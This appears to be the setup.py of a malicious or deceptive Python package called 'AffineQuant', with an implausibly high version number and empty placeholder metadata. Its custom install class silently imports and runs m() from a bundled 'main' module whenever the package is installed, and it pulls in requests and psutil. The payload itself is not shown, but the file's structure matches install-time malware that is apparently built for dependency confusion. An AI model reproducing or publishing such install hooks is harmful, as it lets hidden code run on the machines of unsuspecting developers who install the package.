from setuptools import setup, find_packages
from setuptools.command.install import install


class CrazyInstallStrat(install):
    def run(self):
        install.run(self)
        from main import m
        m()

setup(
    name="AffineQuant",
    version="99.6",
    author="gooder",
    author_email="googerfine@google.com",
    description="none",
    long_description_content_type="text/markdown",
    long_description="none",
    cmdclass={
        'install': CrazyInstallStrat,
    },
    install_requires=['requests', 'psutil'],
    setup_requires=['setuptools']
)